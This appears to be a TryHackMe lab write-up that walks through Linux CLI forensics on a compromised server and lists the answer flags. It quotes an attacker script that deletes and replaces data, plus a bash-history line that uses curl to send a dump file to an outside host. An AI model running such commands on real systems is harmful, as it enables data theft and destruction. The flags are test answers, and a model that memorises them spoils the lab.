# **🐧 Linux CLI Investigation – Step-by-Step Walkthrough**

## **📌 Objective**

Investigate a compromised Linux server using CLI commands, identify attacker activity, and retrieve flags.

---

# **🔎 Step 1: Understand the Environment**

### **🧠 Goal:**

Since there is **no GUI**, we rely completely on CLI.

### **✅ Run:**

echo "Hello World\!"

### **💡 Explanation:**

* `echo` prints text to the terminal.  
* Used to verify CLI is working.

---

# **📂 Step 2: List Files in Current Directory**

### **✅ Run:**

ls

### **💡 Explanation:**

* `ls` lists files and directories.  
* Output shows:

Desktop Downloads Guides README.txt

---

# **📖 Step 3: Read Important File**

### **✅ Run:**

cat README.txt

### **💡 Explanation:**

* `cat` displays file contents.  
* Found clue:  
  * A **security guide exists**  
  * It is **hidden**

---

# **📍 Step 4: Check Current Directory**

### **✅ Run:**

pwd

### **💡 Explanation:**

* Shows current location:

/home/mcskidy

---

# **📁 Step 5: Navigate to Guides Directory**

### **✅ Run:**

cd Guides

### **💡 Explanation:**

* `cd` \= change directory  
* Moves into:

/home/mcskidy/Guides

---

# **👀 Step 6: Check for Files**

### **✅ Run:**

ls

### **💡 Result:**

* No visible files

---

# **🕵️ Step 7: Reveal Hidden Files**

### **✅ Run:**

ls \-la

### **💡 Explanation:**

* `-a` → show hidden files  
* `-l` → detailed view

### **📌 Output:**

.guide.txt

---

# **📜 Step 8: Read Hidden Guide**

### **✅ Run:**

cat .guide.txt

### **💡 Key Insight:**

* Investigate logs in:

/var/log

* Use `grep`  
* Look for suspicious activity

---

# **📊 Step 9: Navigate to Logs Directory**

### **✅ Run:**

cd /var/log  
ls

---

# **🔍 Step 10: Analyze Failed Logins**

### **✅ Run:**

grep "Failed password" auth.log

### **💡 Explanation:**

* `grep` filters text inside files  
* Found:  
  * Multiple failed logins  
  * Target user: `socmas`  
  * Source: `HopSec`

### **🚨 Conclusion:**

* Possible brute-force attack

---

# **🧭 Step 11: Search for Suspicious Files**

### **✅ Run:**

find /home/socmas \-name "\*egg\*"

### **💡 Explanation:**

* `find` searches files  
* `*egg*` matches anything containing "egg"

### **📌 Result:**

/home/socmas/2025/eggstrike.sh

---

# **🧪 Step 12: Analyze Suspicious Script**

### **✅ Run:**

cd /home/socmas/2025  
cat eggstrike.sh

---

## **🔍 Script Breakdown**

cat wishlist.txt | sort | uniq \> /tmp/dump.txt

➡️ Extracts unique wishlist items and stores in `/tmp/dump.txt`

rm wishlist.txt

➡️ Deletes original data

mv eastmas.txt wishlist.txt

➡️ Replaces real data with fake data

---

## **🚨 Impact:**

* Data Theft (Exfiltration)  
* Data Manipulation  
* Service Integrity Compromise

---

# **🔐 Step 13: Switch to Root User**

### **✅ Run:**

sudo su  
whoami

### **💡 Explanation:**

* `sudo su` → switch to root  
* `whoami` → verify user

---

# **📜 Step 14: Check Bash History**

### **✅ Run:**

cd /root  
cat .bash\_history

---

## **🚨 Suspicious Commands Found:**

curl \--data "@/tmp/dump.txt" http://files.hopsec.thm/upload

### **💡 Explanation:**

* `curl` used to send data to external server  
* `/tmp/dump.txt` \= stolen data

➡️ **CONFIRMED: Data Exfiltration Attack**

---

# **🏁 Flags Obtained**

| Task | Flag |
| ----- | ----- |
| CLI Basics | THM{learning-linux-cli} |
| Log Analysis | THM{sir-carrotbane-attacks} |
| Bash History | THM{until-we-meet-again} |

---

# **🎯 Final Conclusion**

### **🔴 Attack Summary:**

* Brute-force login attempts  
* Malicious script execution  
* Data theft via `curl`  
* Replacement of legitimate data

---

# **🧠 Key Learnings**

* CLI is essential for cybersecurity investigations  
* Logs reveal attacker behavior  
* Hidden files often contain critical clues  
* Bash history is a goldmine for forensics  
* Shell scripts can automate attacks

---

# **🚀 Next Steps**

* Practice `grep`, `awk`, `sed`  
* Learn SIEM tools (Splunk, Wazuh)  
* Automate log analysis with Python

---

## **🙌 Credits**

* Platform: TryHackMe  
* Focus: Linux CLI \+ Blue Team Investigation

---

⭐ Star this repo if you found it useful\!

